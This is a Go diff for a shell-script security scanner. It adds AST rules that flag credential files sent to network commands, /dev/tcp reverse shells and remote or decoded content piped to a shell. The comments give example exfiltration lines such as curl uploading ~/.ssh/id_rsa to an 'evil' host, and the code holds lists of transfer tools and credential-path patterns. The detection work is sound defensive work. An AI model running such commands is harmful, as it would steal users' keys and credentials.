@@ -33,6 +33,19 @@ var fenceShellLangs = map[string]bool{
 
 var shebangShellRe = regexp.MustCompile(`^#!.*\b(sh|bash|zsh|ksh|dash|ash)\b`)
 
+// transferCommands move bytes off the machine. It is a superset of
+// fetchCommands: scp and nc never fetch a script to run, but they do carry a
+// file out, which is what the credential-exfiltration check is about.
+var transferCommands = map[string]bool{
+	"curl": true, "wget": true, "nc": true, "ncat": true, "scp": true, "fetch": true,
+}
+
+// credentialPathRe is the structural twin of the regex pass's credentialPath.
+// Keeping the two in step is what stops the regex-only rule from being evaded
+// by splitting the command across lines with a continuation, which is the
+// whole reason this pass exists.
+var credentialPathRe = regexp.MustCompile(`(?i)(?:(?:~|\$\{?HOME\}?)/\.(?:ssh|aws|gnupg|kube|docker|netrc|npmrc)\b|\bid_(?:rsa|dsa|ecdsa|ed25519)\b|\.aws/credentials\b)`)
+
 // shellSnippet is a chunk of shell source plus the 1-based file line on which
 // its first line sits (so AST positions map back to real file lines).
 type shellSnippet struct {
@@ -109,7 +122,7 @@ func analyzeShellSnippet(filename string, sn shellSnippet, report *Report) {
 	}
 
 	fileLine := func(p syntax.Pos) int { return sn.startLine - 1 + int(p.Line()) }
-	add := func(rule, severity, msg string, pos syntax.Pos) {
+	add := func(rule, severity, class, msg string, pos syntax.Pos) {
 		report.Findings = append(report.Findings, Finding{
 			Rule:       rule,
 			Severity:   severity,
@@ -117,6 +130,7 @@ func analyzeShellSnippet(filename string, sn shellSnippet, report *Report) {
 			File:       filename,
 			Line:       fileLine(pos),
 			Message:    msg,
+			Class:      class,
 		})
 	}
 
@@ -128,9 +142,12 @@ func analyzeShellSnippet(filename string, sn shellSnippet, report *Report) {
 			}
 		case *syntax.CallExpr:
 			analyzeCall(n, add)
+			analyzeCredentialTransfer(n, add)
 		case *syntax.Redirect:
 			if n.Word != nil && strings.Contains(n.Word.Lit(), "/dev/tcp/") {
-				add("DANGEROUS_SHELL", "critical",
+				// A reverse shell is the outbound channel itself, not a
+				// guess about one: unappealable.
+				add("DANGEROUS_SHELL", "critical", string(ClassExfiltration),
 					"Shell AST: /dev/tcp reverse shell", n.OpPos)
 			}
 		}
@@ -141,7 +158,7 @@ func analyzeShellSnippet(filename string, sn shellSnippet, report *Report) {
 // analyzePipeline flags a pipeline whose final stage is a shell interpreter fed
 // by a remote fetch (RCE) or a base64 decode (obfuscated execution). It is
 // anchored at the final (shell) stage so nested-pipe revisits dedupe.
-func analyzePipeline(bc *syntax.BinaryCmd, add func(rule, severity, msg string, pos syntax.Pos)) {
+func analyzePipeline(bc *syntax.BinaryCmd, add func(rule, severity, class, msg string, pos syntax.Pos)) {
 	var stages []*syntax.Stmt
 	collectPipeStages(bc.X, &stages)
 	collectPipeStages(bc.Y, &stages)
@@ -149,6 +166,11 @@ func analyzePipeline(bc *syntax.BinaryCmd, add func(rule, severity, msg string, 
 		return
 	}
 	last := stages[len(stages)-1]
+	if credentialPipeline(stages) {
+		add("CREDENTIAL_EXFILTRATION", "critical", string(ClassExfiltration),
+			"Shell AST: credential file piped to a network command", last.Pos())
+		return
+	}
 	if !shellInterpreters[stmtCmdName(last)] {
 		return
 	}
@@ -165,10 +187,13 @@ func analyzePipeline(bc *syntax.BinaryCmd, add func(rule, severity, msg string, 
 	}
 	switch {
 	case sawFetch:
-		add("DATA_EXFILTRATION", "critical",
+		// An RCE cradle: code arriving, not data leaving. It takes the same
+		// appealable class as its regex counterpart, because a network-off
+		// sandbox run measures directly what this rule only guesses.
+		add("DATA_EXFILTRATION", "critical", string(ClassExecution),
 			"Shell AST: remote content piped to a shell (RCE pattern)", last.Pos())
 	case sawDecode:
-		add("OBFUSCATION", "critical",
+		add("OBFUSCATION", "critical", string(ClassHeuristic),
 			"Shell AST: decoded content piped to a shell", last.Pos())
 	}
 }
@@ -200,7 +225,7 @@ func callName(ce *syntax.CallExpr) string {
 }
 
 // analyzeCall flags eval of dynamic content and `shell -c <dynamic>`.
-func analyzeCall(ce *syntax.CallExpr, add func(rule, severity, msg string, pos syntax.Pos)) {
+func analyzeCall(ce *syntax.CallExpr, add func(rule, severity, class, msg string, pos syntax.Pos)) {
 	name := callName(ce)
 	if name == "" {
 		return
@@ -208,7 +233,7 @@ func analyzeCall(ce *syntax.CallExpr, add func(rule, severity, msg string, pos s
 	if name == "eval" {
 		for _, arg := range ce.Args[1:] {
 			if wordHasExpansion(arg) {
-				add("CODE_EXECUTION", "high",
+				add("CODE_EXECUTION", "high", string(ClassExecution),
 					"Shell AST: eval of dynamic (expanded/substituted) content", ce.Pos())
 				break
 			}
@@ -218,7 +243,7 @@ func analyzeCall(ce *syntax.CallExpr, add func(rule, severity, msg string, pos s
 	if shellInterpreters[name] {
 		for i := 1; i < len(ce.Args)-1; i++ {
 			if ce.Args[i].Lit() == "-c" && wordHasExpansion(ce.Args[i+1]) {
-				add("CODE_EXECUTION", "high",
+				add("CODE_EXECUTION", "high", string(ClassExecution),
 					"Shell AST: shell -c executes a dynamic command string", ce.Pos())
 				break
 			}
@@ -243,4 +268,72 @@ func wordHasExpansion(w *syntax.Word) bool {
 		return true
 	})
 	return found
+}
+
+// credentialPipeline reports whether a pipeline reads a credential path in one
+// stage and runs a transfer command in another. Order is not fixed: the read
+// may be `cat ~/.ssh/id_rsa | curl ...` or the sink may name the file itself.
+func credentialPipeline(stages []*syntax.Stmt) bool {
+	sawCred, sawTransfer := false, false
+	for _, s := range stages {
+		if transferCommands[stmtCmdName(s)] {
+			sawTransfer = true
+		}
+		if stmtMentionsCredentialPath(s) {
+			sawCred = true
+		}
+	}
+	return sawCred && sawTransfer
+}
+
+// analyzeCredentialTransfer flags a single command that both is a transfer
+// command and names a credential path — `curl -T ~/.ssh/id_rsa https://evil`,
+// `scp ~/.aws/credentials host:` — with no pipeline involved.
+func analyzeCredentialTransfer(ce *syntax.CallExpr, add func(rule, severity, class, msg string, pos syntax.Pos)) {
+	if !transferCommands[callName(ce)] {
+		return
+	}
+	for _, arg := range ce.Args[1:] {
+		if credentialPathRe.MatchString(wordText(arg)) {
+			// Credential bytes addressed to a network command. Unlike an RCE
+			// cradle, a network-off sandbox run cannot refute this: observing
+			// that nothing left while the network was off says nothing about
+			// what leaves when it is on.
+			add("CREDENTIAL_EXFILTRATION", "critical", string(ClassExfiltration),
+				"Shell AST: credential file handed to a network command", ce.Pos())
+			return
+		}
+	}
+}
+
+// stmtMentionsCredentialPath reports whether any word of a simple command
+// names a credential path.
+func stmtMentionsCredentialPath(s *syntax.Stmt) bool {
+	if s == nil {
+		return false
+	}
+	ce, ok := s.Cmd.(*syntax.CallExpr)
+	if !ok {
+		return false
+	}
+	for _, arg := range ce.Args {
+		if credentialPathRe.MatchString(wordText(arg)) {
+			return true
+		}
+	}
+	return false
+}
+
+// wordText renders a word back to source text. Word.Lit() returns "" for any
+// word containing an expansion, so $HOME/.ssh/id_rsa would be invisible to a
+// Lit-based check.
+func wordText(w *syntax.Word) string {
+	if w == nil {
+		return ""
+	}
+	var b strings.Builder
+	if err := syntax.NewPrinter().Print(&b, w); err != nil {
+		return w.Lit()
+	}
+	return b.String()
 }
